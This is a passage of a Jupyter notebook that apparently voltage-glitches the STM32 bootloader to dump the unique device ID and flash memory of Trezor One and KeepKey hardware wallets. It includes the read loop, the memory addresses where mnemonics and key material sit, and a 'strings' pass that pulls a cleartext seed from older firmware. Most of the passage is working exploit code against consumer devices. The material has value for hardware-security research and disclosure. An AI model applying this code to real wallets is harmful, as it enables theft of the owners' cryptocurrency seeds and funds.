        scope.scopetype.usart.write(bytes([scope.bl_checksum(int(stbl.Command.READ_MEMORY))]))
        if scope.capture(poll_done=True):
            timeout = True
        
        ret = scope.scopetype.usart.read()
        if len(ret) > 0 and ret[0] != stbl.nack:  # If response is not NACK
            print(f"First response {ret.hex(sep=' ')}")
            
        if len(ret) > 0 and ret[0] == stbl.ack:   # 1st ACK
            scope.scopetype.usart.write(addr)        # Send starting address to read
            time.sleep(0.05)
            r = scope.scopetype.usart.read(1)
                
            if len(r) > 0 and r[0] == stbl.ack:   # 2nd ACK
                scope.scopetype.usart.write(bytes([nbytes-1, scope.bl_checksum(nbytes-1)]))   # Send number of bytes to read
                ret = bytearray(scope.scopetype.usart.read(nbytes+1))
        
                if len(ret) > 0 and ret[0] == stbl.ack:   # 3rd ACK                            
                    #print(f"Successful read at {address:#010x} using {voltage}V at offset {goffset}")
                    return ret                    
    
cs.armed = 0
scope.disable_glitch()

In [ ]:
# STM32 Unique Device ID, 96 bits (12 bytes)
# Base address 0x1FFF7A10 per STM32F205xx Reference Manual section 33.1 and STM32F405xx Reference Manual section 39.1
# To successfully read this register, the bootloader requires a byte-aligned starting address

data = bl_read(0x1FFF7A00, 16 + 12)
if data:
    data = data[17:]  # Remove ACK + extraneous bytes
    print(f"Response:\n{data.hex(sep=' ')}")

    # Reverse order in 4-byte blocks (needed for Trezor One)
    # Ex.: '1b 00 36 00 0b 47 37 33 36 31 30 38' becomes '36 31 30 38 0b 47 37 33 1b 00 36 00'
    data_rev = b''.join(reversed([data[i:i+4] for i in range(0, 12, 4)]))
    print(f"Processed:\n{data_rev.hex(sep=' ')}")

    with open(UID_DUMP, 'wb') as file:
        file.write(data_rev)

In [ ]:
# STM32 Flash Memory
# 0x08000000 - 0x0807FFFF, Trezor One: STM32F205RET6 (512KB)
# 0x08000000 - 0x080FFFFF, Trezor One: STM32F205RGT6 1024KB (1MB)

# Trezor Model One mnemonic stored in cleartext in FW < 1.8.0
# Sector 2: Metadata Area (16KB): 0x08008000 - 0x0800BFFF

# Trezor Model One encrypted mnemonic and key material depend on FW >= 1.8.0:
# Sector 2: Storage Area (16KB): 0x08008000 - 0x0800BFFF
# OR
# Sector 3: Storage Area (16KB): 0x0800C000 - 0x0800FFFF

# The encrypted mnemonic begins with 0x02 0x01 and varies in length depending on the BIP-39 words used, up to maximum 192 bytes (0xC0)
# The other required encryption values (Salt, EDEK, ESAK, PVC) begins with 0x02 0x00 0x3C 0x00, fixed at 60 bytes
# https://docs.trezor.io/trezor-firmware/storage/index.html

# KeepKey
# Sector 1: Storage/Config (16KB): 0x08004000 - 0x08007FFF
# OR
# Sector 2: Storage/Config (16KB): 0x08008000 - 0x0800BFFF
# OR
# Sector 3: Storage/Config (16KB): 0x0800C000 - 0x0800FFFF

# Location of (encrypted) mnemonic and key material depend on STORAGE_VERSION
# Encryption starts w/ STORAGE_VERSION 11 (0x0B)

#MEM_START   = 0x08000000
#MEM_STOP    = 0x080FFFFF

#MEM_START   = 0x08004000
#MEM_STOP    = 0x08004B00

MEM_START   = 0x08008000
MEM_STOP    = 0x08008B00

#MEM_START   = 0x0800C000
#MEM_STOP    = 0x0800CB00

DATA_SIZE   = 256    # Number of bytes to read (up to 256 bytes allowed)

for address in range(MEM_START, MEM_STOP, DATA_SIZE):
    while True:
        data = bl_read(address, DATA_SIZE)
        
        if not data or len(data) != DATA_SIZE+1:   # Retry if no data or wrong length
            print(f"Retrying {address:#010x}: Received {len(data) if data else 0} bytes")
            continue
            
        data = data[1:]  # Remove ACK
        print(f"{address:#010x}:\n{data.hex(sep=' ')}")

        with open(FLASH_DUMP, 'ab') as file:
            file.write(data)
        
        break

print("\nDone!")

In [ ]:
# Trezor One < 1.8.0

# Display any printable ASCII data within the extracted binary
result = subprocess.run(['strings', FLASH_DUMP], capture_output=True, text=True)
print(result.stdout)

In [ ]:
cnc_send_command("G1 X0 Y0 Z0 F100")       # Return to zero